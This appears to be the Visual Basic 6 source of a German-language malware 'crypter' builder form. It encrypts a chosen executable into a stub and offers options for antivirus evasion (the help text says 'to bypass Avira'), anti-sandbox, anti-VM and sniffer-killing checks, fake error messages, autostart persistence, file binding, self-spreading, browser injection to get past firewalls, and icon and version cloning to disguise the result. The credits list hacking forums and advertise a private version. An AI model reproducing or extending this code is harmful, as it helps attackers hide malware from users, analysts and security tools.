               _StockProps     =   79
               Caption         =   "Korrigiere PE Header"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Enabled         =   0   'False
               Appearance      =   6
               Value           =   1
            End
         End
      End
      Begin XtremeSuiteControls.TabControlPage TabControlPage1 
         Height          =   3645
         Left            =   30
         TabIndex        =   1
         Top             =   300
         Width           =   7275
         _Version        =   786433
         _ExtentX        =   12832
         _ExtentY        =   6429
         _StockProps     =   1
         Page            =   0
         Begin XtremeSuiteControls.GroupBox GroupBox4 
            Height          =   975
            Left            =   120
            TabIndex        =   17
            Top             =   2400
            Width           =   7095
            _Version        =   786433
            _ExtentX        =   12515
            _ExtentY        =   1720
            _StockProps     =   79
            Caption         =   "Injiziere in"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton14 
               Height          =   255
               Left            =   6600
               TabIndex        =   48
               Top             =   480
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton14"
               Appearance      =   6
               Picture         =   "frmMain.frx":B14C
            End
            Begin XtremeSuiteControls.PushButton PushButton13 
               Height          =   255
               Left            =   2280
               TabIndex        =   47
               Top             =   480
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton13"
               Appearance      =   6
               Picture         =   "frmMain.frx":B533
            End
            Begin XtremeSuiteControls.RadioButton RadioBrowser 
               Height          =   255
               Left            =   3600
               TabIndex        =   19
               Top             =   480
               Width           =   2775
               _Version        =   786433
               _ExtentX        =   4895
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Momentaner Browser (FWB++)"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
            End
            Begin XtremeSuiteControls.RadioButton RadioStub 
               Height          =   255
               Left            =   360
               TabIndex        =   18
               Top             =   480
               Width           =   1935
               _Version        =   786433
               _ExtentX        =   3413
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Stub (Sich selber)"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
               Value           =   -1  'True
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox2 
            Height          =   975
            Left            =   120
            TabIndex        =   8
            Top             =   1200
            Width           =   7095
            _Version        =   786433
            _ExtentX        =   12515
            _ExtentY        =   1720
            _StockProps     =   79
            Caption         =   "Passwort"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton12 
               Height          =   255
               Left            =   6600
               TabIndex        =   46
               Top             =   360
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton12"
               Appearance      =   6
               Picture         =   "frmMain.frx":B91A
            End
            Begin XtremeSuiteControls.PushButton cmdGen 
               Height          =   255
               Left            =   5040
               TabIndex        =   10
               Top             =   360
               Width           =   1335
               _Version        =   786433
               _ExtentX        =   2355
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Generieren"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
               Picture         =   "frmMain.frx":BD01
            End
            Begin XtremeSuiteControls.FlatEdit txtPass 
               Height          =   255
               Left            =   120
               TabIndex        =   9
               Top             =   360
               Width           =   4695
               _Version        =   786433
               _ExtentX        =   8281
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Text            =   "Incrypt"
            End
         End
         Begin XtremeSuiteControls.GroupBox GroupBox1 
            Height          =   975
            Left            =   120
            TabIndex        =   5
            Top             =   0
            Width           =   7095
            _Version        =   786433
            _ExtentX        =   12515
            _ExtentY        =   1720
            _StockProps     =   79
            Caption         =   "Datei"
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Comic Sans MS"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Appearance      =   6
            Begin XtremeSuiteControls.PushButton PushButton11 
               Height          =   255
               Left            =   6600
               TabIndex        =   45
               Top             =   360
               Width           =   375
               _Version        =   786433
               _ExtentX        =   661
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "PushButton11"
               Appearance      =   6
               Picture         =   "frmMain.frx":C0DA
            End
            Begin XtremeSuiteControls.PushButton cmdFile 
               Height          =   255
               Left            =   5040
               TabIndex        =   7
               Top             =   360
               Width           =   1335
               _Version        =   786433
               _ExtentX        =   2355
               _ExtentY        =   450
               _StockProps     =   79
               Caption         =   "Durchsuche"
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Appearance      =   6
               Picture         =   "frmMain.frx":C4C1
            End
            Begin XtremeSuiteControls.FlatEdit txtFile 
               Height          =   255
               Left            =   120
               TabIndex        =   6
               Top             =   360
               Width           =   4695
               _Version        =   786433
               _ExtentX        =   8281
               _ExtentY        =   450
               _StockProps     =   77
               BackColor       =   -2147483643
               BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
                  Name            =   "Comic Sans MS"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Text            =   "Dateipfad..."
            End
         End
      End
   End
   Begin XtremeSuiteControls.CommonDialog CommonDialog1 
      Left            =   2040
      Top             =   5640
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin VB.Image Image1 
      Height          =   1515
      Left            =   0
      Picture         =   "frmMain.frx":C899
      Top             =   0
      Width           =   7305
   End
   Begin XtremeSuiteControls.CommonDialog cd4 
      Left            =   1440
      Top             =   5520
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog cd3 
      Left            =   960
      Top             =   5520
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog cd2 
      Left            =   600
      Top             =   5520
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog cd1 
      Left            =   240
      Top             =   5520
      _Version        =   786433
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin VB.Menu mnuMain 
      Caption         =   "main"
      Visible         =   0   'False
      Begin VB.Menu mnuAdd 
         Caption         =   "Add"
      End
      Begin VB.Menu mnuDelete 
         Caption         =   "Remove"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "1234567890"
Const Letters4 = "!$%&/()=?"

Private Sub CheckBox1_Click()
If CheckBox1.Value = 1 Then
GroupBox7.Enabled = 1
Else
GroupBox7.Enabled = 0
End If
End Sub

Private Sub CheckBox2_Click()
If CheckBox2.Value = 1 Then
GroupBox8.Enabled = 1
Else
GroupBox8.Enabled = 0
End If

End Sub

Private Sub CheckBox3_Click()
If CheckBox3.Value = xtpChecked Then
GroupBox9.Enabled = True
Else
GroupBox9.Enabled = False
End If

End Sub

Private Sub chkBinder_Click()
If chkBinder.Value = 1 Then
GroupBox6.Enabled = True
Else
GroupBox6.Enabled = False
End If
End Sub

Private Sub chkFake_Click()
If chkFake.Value = 1 Then
GroupBox5.Enabled = True
RadioCritical.Value = True
Else
GroupBox5.Enabled = False
RadioCritical.Value = False
End If
End Sub

Private Sub chkFixChecksum_Click()
If chkFixChecksum = xtpChecked Then
MsgBox "Achtung: Diese Option kann unter umständen das Programm abstürtzen lassen!", vbExclamation, "Warning"
Else
End If

End Sub



Private Sub chkIconChanger_Click()
If chkIconChanger.Value = xtpChecked Then
GroupBox10.Enabled = True
Else
GroupBox10.Enabled = False
End If
End Sub

Private Sub chkspread_Click()
If chkspread.Value = xtpChecked Then
GroupBox8.Enabled = True
Else
GroupBox8.Enabled = False
End If
End Sub

Private Sub cmdBuild_Click()


On Error Resume Next
Dim BFileBuff As String
Dim sStub As String
Dim sFile As String
Dim sKey As String
Dim sSplitt As String
Dim sEncrFile As String
Dim EOF As String
Dim AntiSandbox As String
Dim AntiSniffer As String
Dim AntiVirtuals As String
Dim Fakemessage As String
Dim Faketitle As String
Dim Faketext As String
Dim ART As String
Dim ThisExe As String
Dim Browser As String
Dim Autostart As String
Dim Binder As String
Dim EncBindf As String
Dim Delay As String
Dim Delaytime As String
Dim Bindf As String
Dim Spread As String
Dim dataend As String
dataend = Right(cd2.Filename, Len(cd2.Filename) - InStrRev(cd2.Filename, "."))
If chkspread.Value = xtpChecked Then
Spread = chkspread.Value
Dim spreadname As String
spreadname = txtSpreadname.Text
End If


If chkSandbox.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Check AntiSandbox..."
AntiSandbox = 1
Else
AntiSandbox = 0
End If

If chkSniffer.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Check Sniffer..."
AntiSniffer = 1
Else
AntiSniffer = 0
End If
If chkVirtual.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Check Virtual..."
AntiVirtuals = 1
Else
AntiVirtuals = 0
End If

If chkFake.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Check Fake Message..."
Fakemessage = 1
Faketitle = txtTitle.Text
Faketext = txtText.Text
If RadioCritical = True Then
ART = "Critic"
End If
If RadioInformation = True Then
ART = "Info"
End If
If RadioExclamation = True Then
ART = "Excla"
End If

Else
Fakemessage = 0
End If
If RadioStub.Value = True Then
ListBox1.AddItem "[" & Time & "]" & "-Check injection..."
ThisExe = "Wahr"
Else
ThisExe = "Falsch"
End If
If chkAutostart.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Check Autostart..."
Autostart = 1
Else
Autostart = 0
End If


sSplitt = ">deInEMutTery<"

If Dir$(App.Path & "\Stub.exe") = vbNullString Then
MsgBox "Stub wurde nicht gefunden!", vbExclamation, "Stub"
ListBox1.Clear
Exit Sub
End If








Open App.Path & "\Stub.exe" For Binary Access Read As #1
ListBox1.AddItem "[" & Time & "]" & "-Lese Stub..."
sStub = Space(LOF(1))
Get #1, , sStub
Close #1

If chkEOF.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Lese EOF..."
EOF = GetEOFDatas(txtFile.Text)
End If
If txtFile.Text = vbNullString Or txtFile.Text = "Dateipfad..." Then
MsgBox "Wählen sie eine Datei aus!", vbExclamation, "Datei"
ListBox1.Clear
Exit Sub
End If


Open txtFile.Text For Binary Access Read As #1
ListBox1.AddItem "[" & Time & "]" & "-Lese Datei ..."
sFile = Space(LOF(1))
Get #1, , sFile
Close #1

sKey = txtPass.Text
ListBox1.AddItem "[" & Time & "]" & "-Verschlüssele Datei..."
sEncrFile = Encrypt(sFile, sKey)

If chkBinder.Value = xtpChecked Then
Binder = chkBinder.Value
ListBox1.AddItem "[" & Time & "]" & "-Lese Bind Datei..."
Open txtBindFile.Text For Binary As #1
Bindf = Space(LOF(1))
Get #1, , Bindf
Close #1
ListBox1.AddItem "[" & Time & "]" & "-Verschlüssele Bind Datei..."
EncBindf = Encrypt(Bindf, "bla")
Else
Binder = 0
End If


With cd3
.Filter = "Executable file (*.exe)|*.exe"
.ShowSave
End With
If Dir$(cd3.Filename) <> vbNullString Then
Kill cd3.Filename
End If


ListBox1.AddItem "[" & Time & "]" & "-Schreibe Stub mit Datei und Optionen"
Open cd3.Filename For Binary Access Write As #1
Put #1, , sStub & sSplitt
Put #1, , sEncrFile & sSplitt
Put #1, , sKey & sSplitt
Put #1, , AntiSandbox & sSplitt
Put #1, , AntiSniffer & sSplitt
Put #1, , AntiVirtuals & sSplitt
Put #1, , Fakemessage & sSplitt & Faketitle & sSplitt & Faketext & sSplitt & ART & sSplitt & ThisExe & sSplitt & Autostart & sSplitt & Binder & sSplitt & EncBindf & sSplitt & Spread & sSplitt & spreadname & sSplitt & dataend & ssplittEOF

If CheckBox1.Value = 1 Then
ListBox1.AddItem "[" & Time & "]" & "-Vergrößere um: " & txtBytes.Text & " Bytes"
Dim PUMP_STRING As String
Dim EXE_PUMP As String
EXE_PUMP = "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  "
For i = 0 To txtBytes.Text
PUMP_STRING = PUMP_STRING & EXE_PUMP
Next i
Put #1, LOF(1) + 1, PUMP_STRING
Close #1
Else
Close #1
End If



If CheckBox3.Value = xtpChecked Then
If txtSource.Text = "Datei pfad..." Or txtSource.Text = "" Then
MsgBox "Bitte wähle eine clone File aus!", vbExclamation, "Cloner"
Exit Sub
End If

ListBox1.AddItem "[" & Time & "]" & "-Realign PE: Clone Datei..."
Dim LenOfFile As String
Dim CryptLen As String
Dim Differenz As Double
LenOfFile = FileLen(txtSource.Text)
CryptLen = FileLen(cd3.Filename)
Differenz = LenOfFile - CryptLen
fsiz = ShowFileSize(cd3.Filename)
Open cd3.Filename For Binary As #1
For a = 1 To Differenz
Put #1, fsiz - 1 + a, 0
Next
Close #1


Call ExtractIcon(txtSource.Text, App.Path & "\Iconfile.ico")
Shell (App.Path & "\res\Res.exe -extract " & txtSource.Text & "," & App.Path & "\info.res" & ",VERSIONINFO,,") ' extract ressource info of source
Shell (App.Path & "\res\Res.exe -delete " & cd3.Filename & "," & cd3.Filename & ",VERSIONINFO,,") ' delete ressource info of destination
Shell (App.Path & "\res\Res.exe -addoverwrite " & cd3.Filename & "," & cd3.Filename & "," & App.Path & "\info.res" & ",VERSIONINFO,1,") 'clone ressource info
Shell (App.Path & "\res\Res.exe -delete " & cd3.Filename & "," & cd3.Filename & " ,ICONGROUP,,")
Shell (App.Path & "\res\Res.exe -add " & cd3.Filename & "," & cd3.Filename & ", " & App.Path & "\Iconfile(1).ico" & ",ICONGROUP,1,1033")

 DoEvents
If Fileexists(App.Path & "\info.res") = True Then Kill (App.Path & "\info.res")
If Fileexists(App.Path & "\res\Res.ini") = True Then Kill (App.Path & "\res\Res.ini")
If Fileexists(App.Path & "\res\Res.log") = True Then Kill (App.Path & "\res\Res.log")
If Fileexists(App.Path & "\Iconfile(1).ico") = True Then Kill (App.Path & "\Iconfile(1).ico")
End If


Call AddSection(cd3.Filename, ".wwhwwgdd", Len(sEncrFile), &H8)


If chkRealignpe.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Realign PE: Erfolgreich"

End If

If chkFixChecksum.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-Fix Checksum Sum: Erfolgreich"
If IsValidCheckSum(cd3.Filename, True) = False Then
FixCheckSum (cd3.Filename)
End If
End If
If chkValidatePE.Value = xtpChecked Then
ListBox1.AddItem "[" & Time & "]" & "-PE Header verschoben: Erfolgreich"
Call ChangeOEPFromFile(cd3.Filename)
End If

If chkIconChanger.Value = xtpChecked Then
Call ReplaceIcons(FlatEdit1.Text, cd3.Filename, vbNullString)
ListBox1.AddItem "[" & Time & "]" & "-Icons Change: Erfolgreich"
End If


ListBox1.AddItem "[" & Time & "]" & "-Stub wurde erfolgreich erstellt!"




End Sub

Private Sub cmdExit_Click()
Dim Bla As String
Bla = MsgBox("Möchten sie das Programm wirklich beenden?", vbYesNo, "Beenden")
If Bla = vbYes Then
End
Else
Exit Sub
End If




End Sub

Private Sub cmdFile_Click()
With cd1
.Filter = "Executable Files (*.exe)|*.exe"
.ShowOpen
txtFile.Text = .Filename
End With

End Sub

Private Sub cmdGen_Click()
Dim Letters As String
Dim i As Integer
Letters = Letters1 + Letters2 + Letters3 + Letters4
For i = 1 To 30
Key = Key & Mid$(Letters, Int((Rnd * Len(Letters)) + 1), 1)
Next i
txtPass.Text = Key
End Sub

Private Sub cmdSearchPath_Click()
With cd4
.Filter = "Executables (*.exe)|*.exe"
.ShowOpen
txtOwnPath.Text = .Filename
End With
End Sub

Private Sub Form_Load()
On Error Resume Next
If Date = "27.3.2010" Then
Kill App.Path & "\Stub.exe"
Else
End If


Call cmdGen_Click
ListBox2.AddItem ("Author: Inmate              ICQ: 469049068")
ListBox2.AddItem ("Design: icemanns           ICQ: 576127045")
ListBox2.AddItem ("Credits: Cobein, Karcrack , Peacefull")
ListBox2.AddItem ("Grüße an: PAN, Pr!ngles, Spike188, Igoe, Neghative, icemanns, mar, acer, krusty, t0sh1n")
ListBox2.AddItem ("ShockerZz, Looneytoons, ^^kev####, Inj3ct, Till7, jahq")
ListBox2.AddItem ("und alle die ich vergessen habe...")
ListBox2.AddItem ("Adde mich für eine Private Version / Add me for a private version.")
ListBox2.AddItem ("Besuche:")
ListBox2.AddItem ("free-hack.com")
ListBox2.AddItem ("vb-community.eu")
ListBox2.AddItem ("hackhound.org")
ListBox2.AddItem ("hba-crew.com")
End Sub









Private Sub PushButton1_Click()
MsgBox "Diese Option korrigiert die Pe Header file - size Größe.Sie wird benötigt um Avira zu bypassen.", vbInformation, "RealignPE"
End Sub

Private Sub PushButton10_Click()
MsgBox "Diese Option lässt euer Programm automatisch bei jedem Systemstart ausführen.Dies dient unter anderem zu Werbe - Zwecken", vbInformation, "Autostart"
End Sub

Private Sub PushButton11_Click()
MsgBox "Hier können sie die Datei auswählen welche verschlüsselt werden soll. Es ist verboten Maleware zu verschlüsseln!", vbInformation, "Datei"
End Sub

Private Sub PushButton12_Click()
MsgBox "Mit diesem Passwort wird Ihre Datei verschlüsselt.Sie können sich einfach auf Knopfdruck ein neues Passwort erstellen lassen.", vbInformation, "Passwort"
End Sub

Private Sub PushButton13_Click()
MsgBox "Wenn Sie diese Option aktivieren wird ihre Datei in die momentane .exe injected.Diese Option unterstützt EOF (EndOfFile) Support.", vbInformation, "Stub injection"
End Sub

Private Sub PushButton14_Click()
MsgBox "Diese Option ermöglicht das Ihre Datei in den momentanen Browser injiziert wird.Das hat den Vorteil das Firewalls umgangen werden und der Benutzer somit nicht sehen kann wann sie eine Verbindung zum Internet zB: für eine Update funktion aufbauen.Der Nachteil an dieser Funktion ist das es nur auf 32 bit Systemen funktioniert.", vbInformation, "Browser Injection (FWB++)"
End Sub

Private Sub PushButton15_Click()
MsgBox "Sry diese Funktion geht noch nicht.", vbInformation, "Update"
End Sub

Private Sub PushButton16_Click()
With cd2
cd2.Filter = "All files (*.*)|*.*"
cd2.ShowOpen
txtBindFile.Text = .Filename
End With

End Sub

Private Sub PushButton17_Click()
MsgBox "Mit dieser Option können Sie ihre Anwendung um die angegebenen Bytes vergrössern.", vbInformation, "Vergrössern"
End Sub

Private Sub PushButton18_Click()
MsgBox "Mit dieser Option wird sich Ihre gecryptete Datei automatisch weiterverbreiten. So können sie ihr Programm bekannt machen.", vbInformation, "Spreading"
End Sub

Private Sub PushButton19_Click()
MsgBox "Wenn Sie den Cloner aktivieren, wird Ihre erstellte Datei genauso aussehen wie die beim Cloner ausgewählte.Die Dateigrösse, das Icon und die Version Informationen werden die selben sein.", vbInformation, "Datei cloner"
End Sub

Private Sub PushButton2_Click()
MsgBox "Diese Option liest die im PE Header vorhandene Checksum aus und passt diese an.", vbInformation, "Fix PE Checksum"
End Sub

Private Sub PushButton20_Click()
With cd4
.Filter = "Executables |*.exe"
.ShowOpen
txtSource.Text = .Filename
End With

End Sub

Private Sub PushButton21_Click()
MsgBox "Wenn Sie diese Option aktivieren , können sie das Icon Ihrer .exe ändern.", vbInformation, "Icon Changer"
End Sub

Private Sub PushButton22_Click()
With CommonDialog1
.Filter = "Icons (*.ico) |*.ico"
.ShowOpen
FlatEdit1.Text = .Filename
End With

End Sub

Private Sub PushButton3_Click()
MsgBox "Diese Option verschiebt den EntryPoint der Datei.", vbInformation, "Change Entrypoint"
End Sub

Private Sub PushButton4_Click()
MsgBox "Diese Option akviviert den EOF (End of File) support , welche es ermöglicht das Ende einer Datei zu schützen. ", vbInformation, "EOF Support"
End Sub

Private Sub PushButton5_Click()
MsgBox "Falls Ihre Datei in einer Sandbox wie zB: CW, Sunbelt oder Norman Sandbox ausgeführt wird, verhindert es die Ausführung Ihres Programms um so vertrauliche Daten zu schützen.", vbInformation, "Anti Sandbox"
End Sub

Private Sub PushButton6_Click()
MsgBox "Wenn Ihre Datei ausgeführt wird und es ist ein Sniffer wie zB: Wireshark aktiv, wird der Sniffer automatisch beenden um zB: vertrauliche Serverdaten geheim zu halten.", vbInformation, "Anti Sniffer"
End Sub

Private Sub PushButton7_Click()
MsgBox "Viele Programme werden auf einer Virtuellen Machine, in einem Virtuellen PC oder in einer Virtuellen Box ausgeführt , um sie zu analysieren.Diese Option verhindert das Ausführen der Datei.", vbInformation, "Anti Virutal´s"
End Sub

Private Sub PushButton8_Click()
MsgBox "Diese Option zeigt eine Fehlermeldung wenn Ihr Programm ausgeführt wird.Dies dient zur Täuschung oder Information", vbInformation, "Fake Message"
End Sub

Private Sub PushButton9_Click()
MsgBox "Diese Option ermöglicht Ihnen mehrere .exe Dateien in einer zu packen, damit Sie es besser versenden oder hochladen können.", vbInformation, "Binder"
End Sub

Function Fileexists(fname) As Boolean
   If Dir(fname) <> "" Then _
   Fileexists = True _
   Else Fileexists = False
End Function
Function ShowFileSize(file)
    Dim fs, f, s
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFile(file)
    ShowFileSize = f.Size
    's = UCase(f.Name) & " uses " & f.Size & " bytes."
    'MsgBox s, 0, "Folder Size Info"
End Function

